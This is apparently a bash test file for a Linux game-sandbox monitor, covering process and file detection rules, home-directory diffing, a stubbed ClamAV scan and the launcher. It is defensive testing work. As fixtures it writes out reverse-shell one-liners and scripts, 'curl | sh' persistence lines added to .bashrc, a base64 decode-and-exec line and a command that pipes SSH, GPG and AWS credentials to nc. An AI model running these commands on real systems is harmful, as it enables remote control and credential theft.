#!/bin/bash
# Tests for the native Linux monitor rules, home-diff.sh and the ClamAV scanner (wq-scan.sh).
# No firejail, ClamAV or inotify-tools needed: clamscan and inotifywait are replaced by stubs.
#   bash wq-ui/test_native_monitor_scan.sh
set -u
export WQ_PRESCAN=0   # these tests are not about the pre-launch scan (test_prescan.sh is)
SRC="$(cd "$(dirname "$(readlink -f "$0")")/.." && pwd)"
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); }
fail() { FAIL=$((FAIL+1)); echo "FAIL: $1"; [ -n "${2:-}" ] && echo "      $2"; }
eq()   { [ "$2" = "$3" ] && ok || fail "$1" "expected [$2] got [$3]"; }
has()  { grep -qE -- "$2" <<< "$3" && ok || fail "$1" "no match for /$2/ in: $(head -c 300 <<< "$3")"; }
hasnt(){ grep -qE -- "$2" <<< "$3" && fail "$1" "unexpected match /$2/ in: $(head -c 300 <<< "$3")" || ok; }

# a throw-away copy of the project, so tests never touch real games
Q="$T/q"; mkdir -p "$Q"; . "$(dirname "$(readlink -f "$0")")/test_lib.sh"; wq_copy_src "$SRC" "$Q"
mkgame() {  # mkgame <name> [native]
  local g="$Q/$1"; mkdir -p "$g/game" "$g/logs"
  if [ "${2:-}" = native ]; then printf 'EXE=start.sh\nRUNNER=native\nFJ_XEPHYR=0\nFJ_TASKS_MAX=\n' > "$g/game.conf"; mkdir -p "$g/home"
  else printf 'EXE=a.exe\n' > "$g/game.conf"; mkdir -p "$g/prefix"; fi
  echo "$g"
}

# ============================================================================ rules library
# shellcheck source=/dev/null
source "$Q/lib-monitor-native.sh"
lvl() { cut -f1 <<< "$1"; }
H="$T/h"; G="$T/g/game"; mkdir -p "$H" "$G"

echo "== processes"
r="$(native_classify_proc ncat ncat 'ncat 1.2.3.4 4444')";               eq "ncat is an alert" ALERT "$(lvl "$r")"
r="$(native_classify_proc bash bash 'bash -c bash -i >& /dev/tcp/1.2.3.4/9 0>&1')"; has "reverse shell" '/dev/tcp' "$r"; eq "reverse shell level" ALERT "$(lvl "$r")"
r="$(native_classify_proc sh sh 'sh -c echo aGk= | base64 -d | sh')";     eq "base64 into sh" ALERT "$(lvl "$r")"
r="$(native_classify_proc sh sh 'sh -c curl http://x/y | sh')";           eq "curl into sh" ALERT "$(lvl "$r")"
r="$(native_classify_proc python3 python3 "python3 -c import socket,pty;pty.spawn('sh')")"; eq "python reverse shell" ALERT "$(lvl "$r")"
r="$(native_classify_proc python3 python3 'python3 main.py')";            eq "plain python is fine" "" "$r"
r="$(native_classify_proc python python 'python -c print(1)')";           eq "python -c without sockets is fine" "" "$r"
r="$(native_classify_proc bash bash 'bash start.sh')";                    eq "start script is fine" "" "$r"
r="$(native_classify_proc bash bash 'bash -c cat >> /x/.ssh/authorized_keys')"; eq "authorized_keys in cmdline" ALERT "$(lvl "$r")"
r="$(native_classify_proc game game './game' '/memfd:payload (deleted)')"; eq "memfd exec" ALERT "$(lvl "$r")"
r="$(native_classify_proc game game './game' '/opt/game/game (deleted)')"; eq "deleted binary" WARN "$(lvl "$r")"
r="$(native_classify_proc payload payload '/tmp/payload' '/tmp/payload')"; eq "binary from /tmp" WARN "$(lvl "$r")"
r="$(native_classify_proc game game './game' '/tmp/.mount_GameAb12/usr/bin/game')"; eq "AppImage mount is fine" "" "$r"
r="$(native_classify_proc xclip xclip 'xclip -o')";                       eq "clipboard tool" WARN "$(lvl "$r")"
r="$(native_classify_proc busybox ncat 'ncat -l 1234')";                  eq "busybox applet via argv0" ALERT "$(lvl "$r")"
r="$(native_classify_proc game game './Game.x86_64' '/mnt/q/G/game/Game.x86_64')"; eq "the game itself" "" "$r"
r="$(native_classify_proc sync sync 'sync')";                             eq "anchored (sync is not nc)" "" "$r"

echo "== files"
p() { native_classify_path "$1" "${2:-CREATE}" "$H" "$G"; }
r="$(p "$H/.config/autostart/x.desktop")";        eq "autostart" ALERT "$(lvl "$r")"
r="$(p "$H/.config/systemd/user/x.service")";     eq "systemd user unit" ALERT "$(lvl "$r")"
r="$(p "$H/.config/environment.d/x.conf")";       eq "environment.d" ALERT "$(lvl "$r")"
r="$(p "$H/.ssh/authorized_keys" CLOSE_WRITE)";   eq "ssh dir" ALERT "$(lvl "$r")"
r="$(p "$H/.local/bin/ls")";                      eq ".local/bin" ALERT "$(lvl "$r")"
r="$(p "$H/.bashrc" CLOSE_WRITE)";                eq "bashrc level" ALERT "$(lvl "$r")"; eq "bashrc kind" rc "$(cut -f2 <<< "$r")"
r="$(p "$H/.config/fish/config.fish" MOVED_TO)";  eq "fish config" ALERT "$(lvl "$r")"
r="$(p "$H/.local/share/applications/x.desktop")"; eq "desktop launcher is a warn" WARN "$(lvl "$r")"
r="$(p "$H/.config/autostart" CREATE,ISDIR)";     eq "directories ignored" "" "$r"
r="$(p "$H/.config/mygame/save1.dat" CLOSE_WRITE)"; eq "ordinary save is fine" "" "$r"
r="$(p "$H/.profilex" CLOSE_WRITE)";              eq ".profilex is not .profile" "" "$r"
r="$(p "$T/elsewhere/file" CREATE)";              eq "outside home and game" "" "$r"
printf '\x7fELF\x02\x01\x01\x00more' > "$G/dropper"
r="$(p "$G/dropper" CLOSE_WRITE)";                eq "ELF in game dir" WARN "$(lvl "$r")"; has "ELF message" 'ELF' "$r"
printf '#!/bin/sh\n' > "$G/run.sh"
r="$(p "$G/run.sh" CLOSE_WRITE)";                 eq "script in game dir" WARN "$(lvl "$r")"
r="$(p "$G/run.sh" CREATE)";                      eq "CREATE alone is not reported twice" "" "$r"
printf 'savegame' > "$G/save.dat"
r="$(p "$G/save.dat" CLOSE_WRITE)";               eq "data file in game dir" "" "$r"
printf '\x7fELF....' > "$H/payload.bin"
r="$(p "$H/payload.bin" CLOSE_WRITE)";            eq "ELF in home" WARN "$(lvl "$r")"
r="$(p "$G/gone" CREATE)";                        eq "vanished file" "" "$r"

# ============================================================================ home-diff
echo "== skeleton files"
: > "$T/empty"; echo hi > "$T/full"
native_is_skeleton "$T/empty" .bashrc && ok || fail "empty file is a skeleton"
native_is_skeleton "$T/full" .bashrc && fail "content is not a skeleton" || ok
native_is_skeleton "$T/missing" .bashrc && fail "missing file is not a skeleton" || ok

echo "== home-diff"
g="$(mkgame hd native)"; AL="$g/logs/a.log"
echo 'echo hi' > "$g/home/.bashrc"; mkdir -p "$g/home/.config/autostart"; touch "$g/game/start.sh"; chmod +x "$g/game/start.sh"
"$Q/home-diff.sh" snapshot "$g"
out="$("$Q/home-diff.sh" compare "$g" "$AL" 2>&1)"
has "unchanged" 'Home unchanged' "$out"
"$Q/home-diff.sh" snapshot "$g"
echo 'curl evil|sh' >> "$g/home/.bashrc"
printf '[Desktop Entry]\n' > "$g/home/.config/autostart/evil.desktop"
mkdir -p "$g/home/.local/share/applications"; echo x > "$g/home/.local/share/applications/l.desktop"
printf '\x7fELF' > "$g/game/dropped"; chmod +x "$g/game/dropped"
out="$("$Q/home-diff.sh" compare "$g" "$AL" 2>&1)"
has "bashrc modified" 'ALERT.*modified ~/\.bashrc' "$out"
has "autostart created" 'ALERT.*created ~/\.config/autostart/evil\.desktop' "$out"
has "launcher only warns" 'WARN.*created ~/\.local/share/applications/l\.desktop' "$out"
has "new executable" 'WARN.*1 new executable.*dropped' "$out"
hasnt "start.sh not new" 'start\.sh' "$out"
has "diff log written" 'bashrc' "$(cat "$g"/logs/homediff-*.log)"
has "alert log has the lines" '\[ALERT\]' "$(cat "$AL")"
out="$("$Q/home-diff.sh" compare "$g" "$AL" 2>&1)"
has "new baseline accepted" 'Home unchanged' "$out"
rm "$g/home/.bashrc"; out="$("$Q/home-diff.sh" snapshot "$g"; "$Q/home-diff.sh" compare "$g" "$AL" 2>&1)"
g6="$(mkgame hd3 native)"; "$Q/home-diff.sh" snapshot "$g6"; : > "$g6/home/.zshrc"
out="$("$Q/home-diff.sh" compare "$g6" "$g6/logs/a.log" 2>&1)"
has "empty skeleton .zshrc is ignored" 'ignored' "$out"; hasnt "empty skeleton is not an alert" 'ALERT' "$out"
"$Q/home-diff.sh" snapshot "$g6"; rm "$g6/home/.zshrc"; "$Q/home-diff.sh" snapshot "$g6"; echo 'evil' > "$g6/home/.zshrc"
out="$("$Q/home-diff.sh" compare "$g6" "$g6/logs/a.log" 2>&1)"
has "a .zshrc with content is still an alert" 'ALERT.*created ~/\.zshrc' "$out"
# a changed fish config is session startup code, an ALERT like .bashrc (it used to fall into the .config/* WARN rule)
g7="$(mkgame hdf native)"; mkdir -p "$g7/home/.config/fish"; echo '# mine' > "$g7/home/.config/fish/config.fish"
"$Q/home-diff.sh" snapshot "$g7"; echo 'curl evil | sh' >> "$g7/home/.config/fish/config.fish"
out="$("$Q/home-diff.sh" compare "$g7" "$g7/logs/a.log" 2>&1)"
has "modified fish config is an ALERT" 'ALERT.*modified ~/\.config/fish/config\.fish' "$out"
# a game dir with a space in a file name
g2="$(mkgame hd2 native)"; mkdir -p "$g2/home/.config/autostart"; "$Q/home-diff.sh" snapshot "$g2"
echo x > "$g2/home/.config/autostart/my thing.desktop"
out="$("$Q/home-diff.sh" compare "$g2" "$g2/logs/a.log" 2>&1)"
has "names with spaces" 'created ~/\.config/autostart/my thing\.desktop' "$out"

# ============================================================================ wq-scan
echo "== wq-scan"
STUB="$T/clamscan"; cat > "$STUB" <<'EOS'
#!/bin/bash
# stand-in for clamscan: flags any file containing EICAR-TEST, records the list it was given
for a in "$@"; do case "$a" in --file-list=*) L="${a#--file-list=}" ;; esac; done
[ -n "${STUB_LOG:-}" ] && cp "$L" "$STUB_LOG"
[ -n "${STUB_RC:-}" ] && { echo "ERROR: stub failure"; exit "$STUB_RC"; }
n=0; bad=0
while IFS= read -r f; do n=$((n+1)); if grep -q EICAR-TEST "$f" 2>/dev/null; then echo "$f: Eicar-Test-Signature FOUND"; bad=$((bad+1)); fi; done < "$L"
echo; echo "----------- SCAN SUMMARY -----------"; echo "Scanned files: $n"; echo "Infected files: $bad"
[ "$bad" -gt 0 ] && exit 1; exit 0
EOS
chmod +x "$STUB"
DB="$T/db"; mkdir -p "$DB"; touch "$DB/main.cvd" "$DB/daily.cld"
export CLAM_BIN="$STUB" CLAM_DB_DIR="$DB" CLAM_SANDBOX=0 STUB_LOG="$T/list.txt"
scan() { "$Q/wq-scan.sh" "$@" 2>&1; }

g="$(mkgame sc)"; echo data > "$g/game/a.exe"; echo dll > "$g/prefix/x.dll"
out="$(CLAM_BIN=/nonexistent scan sc --when add)";             rc=$?; has "missing clamscan skips" 'skipped.*not installed' "$out"; eq "missing clamscan rc" 0 "$rc"
out="$(CLAM_DB_DIR="$T/nodb" scan sc --when add)";             has "missing database skips" 'no signature database' "$out"
touch -d '30 days ago' "$DB"/*; out="$(scan sc --when add)";   has "stale database warns" 'day\(s\) old' "$out"; touch "$DB"/*
out="$(scan sc --when add)";                                   rc=$?; has "add scan clean" 'ClamAV: 1 file\(s\) scanned, none flagged' "$out"; eq "add scan rc" 0 "$rc"
has "add scans game/ only" 'a\.exe' "$(cat "$T/list.txt")"; hasnt "add does not scan prefix" 'x\.dll' "$(cat "$T/list.txt")"
ls "$g/logs"/alerts-*-scan.log >/dev/null 2>&1 && ok || fail "add writes alerts-*-scan.log"

AL="$g/logs/run.log"
out="$(scan sc --when run --alertlog "$AL")"
has "first run scan is full" 'full' "$out"; has "run scans prefix" 'x\.dll' "$(cat "$T/list.txt")"
out="$(scan sc --when run --alertlog "$AL")";                  has "nothing new" 'nothing new to scan' "$out"
# "changed" is judged by ctime (a game cannot set it), so the stamps are moved to just after the old
# files were last touched instead of backdating the files
sleep 0.1; touch "$g/.clam-stamp" "$g/.clam-fullstamp"; sleep 0.1
echo fresh > "$g/prefix/new.dll"
out="$(scan sc --when run --alertlog "$AL")";                  has "incremental scan" 'changed since last scan' "$out"
eq "only the changed file is scanned" "$g/prefix/new.dll" "$(cat "$T/list.txt")"
# a file whose mtime was set far into the past (what a game inside the jail can do) is still "changed"
sleep 0.1; touch "$g/.clam-stamp" "$g/.clam-fullstamp"; sleep 0.1
echo evil > "$g/prefix/backdated.dll"; touch -d '2020-01-01' "$g/prefix/backdated.dll"
out="$(scan sc --when run --alertlog "$AL")"
eq "a backdated file is still picked up by the incremental scan" "$g/prefix/backdated.dll" "$(cat "$T/list.txt")"
# a newline in a path cannot go through --file-list: it is reported, not silently skipped
mkdir -p "$g/game/$(printf 'd\nir')"; echo x > "$g/game/$(printf 'd\nir')/f.bin"
out="$(scan sc --when manual --alertlog "$AL")"
has "a path with a newline is reported as unscanned" 'newline in their path' "$(cat "$AL")"
hasnt "and the broken path never reaches the file list" 'f\.bin' "$(cat "$T/list.txt")"
rm -rf "$g/game/$(printf 'd\nir')" "$g/prefix/backdated.dll"   # keep the later counts as they were
touch -d '10 days ago' "$g/.clam-fullstamp"
out="$(scan sc --when run --alertlog "$AL")";                  has "periodic full rescan" '\(full[,)]' "$out"
eq "full rescan lists everything" 3 "$(wc -l < "$T/list.txt")"

echo 'X5O!P%@AP EICAR-TEST' > "$g/prefix/drive_c_dropper.dll"
out="$(scan sc --when run --alertlog "$AL")";                  rc=$?; eq "detection rc" 1 "$rc"
has "detection printed" 'ALERT.*ClamAV: prefix/drive_c_dropper\.dll: Eicar-Test-Signature' "$out"
has "detection in alert log" '\[ALERT\] ClamAV: prefix/drive_c_dropper' "$(cat "$AL")"
out="$("$Q/summarize-run.sh" "$g" "$AL")"
has "summary says review needed" 'REVIEW NEEDED' "$out"

# a path that itself contains ": " must not cut the signature name wrong
gc="$(mkgame colon)"; mkdir -p "$gc/game/a: b"; echo 'X5O EICAR-TEST' > "$gc/game/a: b/evil.bin"
out="$(scan colon --when add --alertlog "$gc/logs/r.log")"
has "detection in a path containing ': '" 'ALERT.*ClamAV: game/a: b/evil\.bin: Eicar-Test-Signature' "$out"

# the run summary reports what monitor.sh logs about suppressed Wine runtime writes (the grep used to match nothing)
gr="$(mkgame rt)"; printf '[2026-01-01 00:00:00] [INFO] 17 known-runtime component(s) written to system32 (suppressed)\n' > "$gr/logs/alerts-x.log"
out="$("$Q/summarize-run.sh" "$gr" "$gr/logs/alerts-x.log")"
has "summary reports the runtime component count" '17 known Wine/DXVK component' "$out"
has "runtime writes alone are still CLEAN" 'VERDICT:.*CLEAN' "$out"

# native games scan home/, not prefix/
gn="$(mkgame scn native)"; echo x > "$gn/game/start.sh"; echo y > "$gn/home/save"; mkdir -p "$gn/prefix"; echo z > "$gn/prefix/ignored"
scan scn --when run --alertlog "$gn/logs/r.log" >/dev/null
has "native scans home" 'home/save' "$(cat "$T/list.txt")"; hasnt "native skips prefix" 'prefix' "$(cat "$T/list.txt")"

# per-game and global switches
g3="$(mkgame off)"; echo 'CLAM_SCAN=0' >> "$g3/game.conf"; echo x > "$g3/game/a.exe"
out="$(scan off --when run --alertlog "$g3/logs/r.log")";      eq "CLAM_SCAN=0 disables" "" "$out"
out="$(CLAM_SCAN_ON_ADD=0 scan off --when add)";               eq "CLAM_SCAN_ON_ADD=0 disables" "" "$out"
g4="$(mkgame on)"; echo 'CLAM_SCAN=1' >> "$g4/game.conf"; echo x > "$g4/game/a.exe"
out="$(CLAM_SCAN_AFTER_RUN=0 scan on --when run --alertlog "$g4/logs/r.log")"; has "per-game CLAM_SCAN=1 wins" 'none flagged' "$out"

# scanner failure: reported, never blocks, stamp not advanced
g5="$(mkgame err)"; echo x > "$g5/game/a.exe"
out="$(STUB_RC=2 scan err --when add)";                        rc=$?; eq "failure rc" 0 "$rc"; has "failure reported" 'did not complete.*stub failure' "$out"
[ ! -e "$g5/.clam-stamp" ] && ok || fail "stamp must not advance after a failed scan"

# bad usage
scan >/dev/null; eq "usage error" 2 "$?"
scan nosuchgame >/dev/null; eq "unknown game" 2 "$?"
scan ../etc >/dev/null; eq "path traversal in name" 2 "$?"
out="$("$Q/wq-scan.sh" --check)";                              has "--check output" 'database:' "$out"
unset CLAM_BIN CLAM_DB_DIR CLAM_SANDBOX STUB_LOG

# ============================================================================ monitor.sh, native mode
echo "== monitor.sh (native mode, stubbed inotifywait)"
BIN="$T/bin"; mkdir -p "$BIN"
cat > "$BIN/inotifywait" <<'EOS'
#!/bin/bash
# prints the canned events in $STUB_EVENTS after $STUB_DELAY seconds (once), then idles like -m would
[ -n "${STUB_DIE:-}" ] && exit 1      # a watcher that is gone (watch limit, folder removed)
sleep "${STUB_DELAY:-0}"
[ -n "${STUB_EVENTS:-}" ] && [ -f "$STUB_EVENTS" ] && cat "$STUB_EVENTS"
sleep 30
EOS
chmod +x "$BIN/inotifywait"
ln -s "$(command -v sleep)" "$BIN/ncat"

# run_monitor <game dir> <command to run as the "sandbox"> [events file] > alert log copy
run_monitor() {
  local g="$1" child="$2" ev="${3:-}" log="$1/logs/alerts-test.log"
  ( export PATH="$BIN:$PATH" ALERT_TERMINAL=/bin/true POLL_INTERVAL=1 LOG_FLUSH_INTERVAL=1 \
           STUB_EVENTS="$ev" STUB_DELAY=4 WQ_MONITOR_HOME="$g/home" WQ_MONITOR_PRIVATE=1
    bash -c "$child" & FJ=$!
    "$Q/monitor.sh" "$g" "$FJ" "$log" >/dev/null 2>&1 )
  cat "$log" 2>/dev/null
}

gm6="$(mkgame m6 native)"; echo "CLOSE_WRITE,CLOSE|$gm6/home/.bashrc" > "$T/ev6"
gm1="$(mkgame m1 native)"; gm2="$(mkgame m2 native)"; gm3="$(mkgame m3 native)"; gm4="$(mkgame m4 native)"; gm5="$(mkgame m5 native)"
# 1: autostart entry appears            2: a child process named ncat appears
# 3: .bashrc event, content unchanged   4: .bashrc event, content changed after the baseline
# 5: ELF dropped into game/ (WARN only, must not kill the sandbox)
mkdir -p "$gm1/home/.config/autostart"; echo '[Desktop Entry]' > "$gm1/home/.config/autostart/x.desktop"
echo "CLOSE_WRITE,CLOSE|$gm1/home/.config/autostart/x.desktop" > "$T/ev1"
echo 'export A=1' > "$gm3/home/.bashrc"; echo "CLOSE_WRITE,CLOSE|$gm3/home/.bashrc" > "$T/ev3"
echo 'export A=1' > "$gm4/home/.bashrc"; echo "CLOSE_WRITE,CLOSE|$gm4/home/.bashrc" > "$T/ev4"
printf '\x7fELF\x02\x01' > "$gm5/game/dropper"; echo "CLOSE_WRITE,CLOSE|$gm5/game/dropper" > "$T/ev5"

(run_monitor "$gm1" 'sleep 7' "$T/ev1" > "$T/out1") &
(run_monitor "$gm2" "$BIN/ncat 20 & wait" > "$T/out2") &
(run_monitor "$gm3" 'sleep 7' "$T/ev3" > "$T/out3") &
(run_monitor "$gm4" "sleep 3; echo 'curl evil | sh' >> '$gm4/home/.bashrc'; sleep 4" "$T/ev4" > "$T/out4") &
(run_monitor "$gm5" 'sleep 7' "$T/ev5" > "$T/out5") &
(run_monitor "$gm6" "sleep 2; : > '$gm6/home/.bashrc'; sleep 5" "$T/ev6" > "$T/out6") &
wait
out="$(cat "$T/out1")"; has "mode reported" 'mode: native' "$out"; has "autostart event raises ALERT" 'ALERT\] Autostart entry written' "$out"; has "kill switch fired" 'Kill switch' "$out"
eq "kill switch fired exactly once" 1 "$(grep -c 'Kill switch' "$T/out1")"
out="$(cat "$T/out2")"; has "ncat child raises ALERT" 'ALERT\] Suspicious process: ncat' "$out"
out="$(cat "$T/out3")"; hasnt "unchanged rc file is ignored" 'ALERT' "$out"
out="$(cat "$T/out4")"; has "changed rc file raises ALERT" 'ALERT\] Shell/session startup file written: ~/\.bashrc' "$out"
out="$(cat "$T/out6")"; hasnt "empty skeleton .bashrc created after start is ignored" 'ALERT' "$out"
out="$(cat "$T/out5")"; has "dropped ELF is a WARN" 'WARN\] New executable \(ELF\) written in game folder: dropper' "$out"; hasnt "dropped ELF does not kill" 'Kill switch' "$out"
[ ! -d "$gm1/logs/.monitor-killed" ] && ok || fail "kill flag removed at shutdown"

# the Windows/Wine mode must be untouched: same rules, none of the native ones
ln -s "$(command -v sleep)" "$BIN/powershell.exe"
gw="$(mkgame w1)"
out="$(run_monitor "$gw" "$BIN/powershell.exe 20 & wait")"
has "wine mode reported" 'mode: wine' "$out"
has "wine: fresh prefix message" 'Wine INIT' "$out"
has "wine: powershell raises ALERT" 'ALERT\] Suspicious process running: .*powershell' "$out"
hasnt "wine: no native rules" 'Native mode' "$out"

# a suspicious program in a folder with a space in its name ("C:\\Program Files\\...") used to be cut at the
# space and never matched by name
mkdir -p "$T/Program Files"; cp "$(command -v sleep)" "$T/Program Files/curl.exe"
gwsp="$(mkgame wsp)"
out="$(run_monitor "$gwsp" "'$T/Program Files/curl.exe' 20 & wait")"
has "wine: suspicious name inside a path with spaces" 'ALERT\] Suspicious process running: .*curl\.exe' "$out"
# events are stamped when they happen, not when the buffer is flushed
gwts="$(mkgame wts)"
out="$(run_monitor "$gwts" "sleep 6")"
has "wine: log lines carry a timestamp" '^\[[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9:]{8}\] \[INFO\] Monitor started' "$out"
hasnt "wine: no raw tab separators leak into the log" $'\t' "$out"

# Wine watcher: "event|path" so a '|' in a file name cannot shift the fields (it used to be "path|event")
gw2="$(mkgame w2)"; mkdir -p "$gw2/prefix/drive_c/windows/system32"; touch "$gw2/prefix/system.reg"
printf 'CREATE|%s/game/evil|.bat\n' "$gw2" > "$T/evw"
out="$(run_monitor "$gw2" 'sleep 7' "$T/evw")"
has "wine: a file name containing | is still judged by its whole name" 'ALERT\] Suspicious file in game dir: .*evil\|\.bat \(CREATE\)' "$out"
# a watcher that dies mid-run must be reported, not silently leave the run unmonitored
gw3="$(mkgame w3)"; mkdir -p "$gw3/prefix/drive_c/windows/system32"; touch "$gw3/prefix/system.reg"
out="$(STUB_DIE=1 run_monitor "$gw3" 'sleep 6')"
has "wine: a lost filesystem watcher is reported" 'WARN\] The filesystem watcher stopped' "$out"
hasnt "a lost watcher does not kill the sandbox by itself" 'Kill switch' "$out"
gw4="$(mkgame w4)"; mkdir -p "$gw4/prefix/drive_c/windows/system32"; touch "$gw4/prefix/system.reg"
out="$(run_monitor "$gw4" 'sleep 6')"
hasnt "a healthy watcher raises no such warning" 'watcher stopped' "$out"
gm7="$(mkgame m7 native)"
out="$(STUB_DIE=1 run_monitor "$gm7" 'sleep 6')"
has "native: a lost watcher is reported too" 'WARN\] The filesystem watcher stopped' "$out"

# ============================================================================ launcher glue
echo "== rules library: script names and script text (native)"
nc5() { native_classify_proc "$1" "$2" "$3" "" "$4"; }
has "script with an attack-tool name is an alert" '^ALERT.*attack-tool name: reverse_shell\.py' "$(nc5 python3 python3 'python3 reverse_shell.py' reverse_shell.py)"
has "keylogger.sh in a path is an alert" '^ALERT.*keylogger\.sh' "$(nc5 bash bash 'bash k' /tmp/x/keylogger.sh)"
has "payload-named script is a warning" '^WARN.*attack stage \(payload\)' "$(nc5 bash bash 'bash payload.sh' payload.sh)"
eq "start.sh is nothing" "" "$(nc5 bash bash 'bash start.sh' start.sh)"
eq "main.py is nothing" "" "$(nc5 python3 python3 'python3 main.py' main.py)"
ST="$T/st"; mkdir -p "$ST"
printf '#!/usr/bin/env python3\nimport socket,subprocess,os\ns=socket.socket()\ns.connect(("10.0.0.1",4444))\nos.dup2(s.fileno(),0)\nsubprocess.call(["/bin/sh"])\n' > "$ST/rs.py"
printf '#!/bin/bash\necho x >> ~/.bashrc\n' > "$ST/pers.sh"
printf '#!/bin/bash\nexec "$(dirname "$0")/game"\n' > "$ST/ok.sh"
printf 'import subprocess\nfor i in range(50): subprocess.Popen(["sleep","1"])\n' > "$ST/spawner.py"
printf 'cat ~/.ssh/id_rsa ~/.gnupg/x ~/.aws/credentials | nc h 1\n' > "$ST/creds.sh"
printf 'import base64\nexec(base64.b64decode("aGk="))\n' > "$ST/b64.py"
printf 'nc 10.0.0.1 4444 -e /bin/sh\n' > "$ST/nce.sh"
printf 'import http.server\nos.dup2(self.rfile.fileno(), 0)\n' > "$ST/cgi.py"
has "reverse shell content (python)" 'ALERT.*reverse-shell' "$(native_scan_script "$ST/rs.py")"
has "reverse shell content (nc -e)" 'ALERT.*reverse-shell' "$(native_scan_script "$ST/nce.sh")"
has "persistence write" 'ALERT.*installs itself' "$(native_scan_script "$ST/pers.sh")"
has "several credential stores" 'ALERT.*credential stores' "$(native_scan_script "$ST/creds.sh")"
has "decode and exec" 'ALERT.*decodes data and runs it' "$(native_scan_script "$ST/b64.py")"
eq "ordinary launcher script is nothing" "" "$(native_scan_script "$ST/ok.sh")"
eq "a script that only spawns sleeps is nothing by text" "" "$(native_scan_script "$ST/spawner.py")"
eq "dup2 without an outgoing connect is nothing" "" "$(native_scan_script "$ST/cgi.py")"

echo "== monitor.sh: spawners, short-lived children, script content (native)"
mkdir -p "$Q/sp/game" "$Q/sp/logs" "$Q/sp/home"; printf 'EXE=start.sh\nRUNNER=native\nFJ_XEPHYR=0\nFJ_TASKS_MAX=\n' > "$Q/sp/game.conf"
cat > "$Q/sp/game/spawner.py" <<'EOS'
import subprocess, time
for c in (["id"],["whoami"],["uname","-a"]):
    subprocess.run(c, stdout=subprocess.DEVNULL); time.sleep(0.05)
ps=[subprocess.Popen(["sleep","2"]) for _ in range(30)]
time.sleep(2)
EOS
printf 'import socket,os\ns=socket.socket()\ntry: s.connect(("127.0.0.1",9))\nexcept Exception: pass\nos.dup2(s.fileno(),0)\nimport time; time.sleep(4)\n' > "$Q/sp/game/helper.py"
out="$(NATIVE_SPAWN_WARN=25 run_monitor "$Q/sp" "cd $Q/sp/game; python3 spawner.py; true")"
has "a spawner is warned about" 'WARN.*has started [0-9]+ child processes' "$out"
has "an attack-stage-named script is warned about" 'WARN.*attack stage \(spawner\)' "$out"
: > "$Q/sp/logs/alerts-test.log"; out="$(run_monitor "$Q/sp" "cd $Q/sp/game; python3 helper.py; true")"
has "a script's reverse-shell CONTENT is an alert when an interpreter runs it" 'ALERT\] Script helper\.py \(run by python[0-9.]*\): Script opens a socket' "$out"

echo "== _launch-native.sh end to end (stub firejail)"
cat > "$BIN/firejail" <<'EOS'
#!/bin/bash
# stand-in for firejail: honours --private=DIR as $HOME, drops every option, runs the command
while [ $# -gt 0 ]; do
  case "$1" in --private=*) export HOME="${1#--private=}" ;; --) shift; break ;; esac
  shift
done
exec "$@"
EOS
chmod +x "$BIN/firejail"
gl="$(mkgame launch native)"
# the stub jail cannot restrict namespaces, hide sockets or hide /dev/input: tell the preflight, so the
# host's own docker.sock / libvirt socket / input devices do not abort the launch (exit 97)
printf 'FJ_RESTRICT_NS=0\nFJ_BLOCK_SOCKETS=0\nFJ_NOINPUT=0\nFJ_XEPHYR=0\nFJ_TASKS_MAX=\n' >> "$gl/game.conf"
printf '#!/bin/bash\nD="$(dirname "$(readlink -f "$0")")"\nexec "$(dirname "$D")/wq-ui/_launch-native.sh" "$(basename "$D")"\n' > "$gl/launch-quarantine.sh"; chmod +x "$gl/launch-quarantine.sh"
cat > "$gl/game/start.sh" <<'EOS'
mkdir -p "$HOME/.config/autostart"
echo '[Desktop Entry]' > "$HOME/.config/autostart/evil.desktop"
echo 'X5O EICAR-TEST' > "$HOME/dropped.bin"
sleep 3
exit 7
EOS
out="$(cd "$T" && PATH="$BIN:$PATH" POLL_INTERVAL=1 LOG_FLUSH_INTERVAL=1 ALERT_TERMINAL=/bin/true NATIVE_VERIFY=0 \
       CLAM_BIN="$STUB" CLAM_DB_DIR="$DB" CLAM_SANDBOX=0 \
       "$gl/launch-quarantine.sh" 2>&1)"; rc=$?
eq "launcher passes on the game's exit code" 7 "$rc"
alog="$(cat "$gl"/logs/alerts-2*.log 2>/dev/null)"
has "home diff ran" 'ALERT\] Home diff: created ~/\.config/autostart/evil\.desktop' "$alog"
has "ClamAV ran after the run" 'ALERT\] ClamAV: home/dropped\.bin: Eicar-Test-Signature' "$alog"
has "summary shows the verdict" 'REVIEW NEEDED' "$out"
has "summary lists the home diff" 'Home diff' "$out"
has "summary lists ClamAV" '--- ClamAV ---' "$out"

# an AppImage must not try to FUSE-mount itself inside the jail
ga="$(mkgame appimg native)"
printf 'FJ_RESTRICT_NS=0\nFJ_BLOCK_SOCKETS=0\nFJ_NOINPUT=0\nFJ_XEPHYR=0\nFJ_TASKS_MAX=\n' >> "$ga/game.conf"; sed -i 's/^EXE=.*/EXE=Game.AppImage/' "$ga/game.conf"
printf '#!/bin/bash\necho "appimage-mode=${APPIMAGE_EXTRACT_AND_RUN:-unset}"\n' > "$ga/game/Game.AppImage"
printf '#!/bin/bash\nD="$(dirname "$(readlink -f "$0")")"\nexec "$(dirname "$D")/wq-ui/_launch-native.sh" "$(basename "$D")"\n' > "$ga/launch-quarantine.sh"; chmod +x "$ga/launch-quarantine.sh"
out="$(cd "$T" && PATH="$BIN:$PATH" POLL_INTERVAL=1 LOG_FLUSH_INTERVAL=1 ALERT_TERMINAL=/bin/true NATIVE_VERIFY=0 CLAM_SCAN_AFTER_RUN=0 "$ga/launch-quarantine.sh" 2>&1)"
has "AppImage runs with APPIMAGE_EXTRACT_AND_RUN=1" 'appimage-mode=1' "$out"

# creating a native game: names with a newline are refused (new-quarantine.sh already did this)
out="$(WQ_SKIP_SCAN=1 "$Q/wq-ui/new-native.sh" $'bad\nname' 2>&1)"; rc=$?
[ "$rc" -ne 0 ] && ok || fail "new-native.sh refuses a newline in the name"
[ ! -e "$Q/bad"* ] 2>/dev/null && ok || fail "no folder left behind by a refused name"

echo "== audit fixes: content-based file rules, temp dirs, kernel-name shells, first-sight judging, home inventory, summary"
# 1+2: what a file IS, not what it is called
NH="$T/nh"; NG="$T/ng"; NR="$T/nroot"; mkdir -p "$NH/work" "$NG" "$NR/tmp" "$NR/tmp/.X11-unix"
printf '#!/bin/sh\necho hi\n' > "$NH/notes.txt"; chmod +x "$NH/notes.txt"
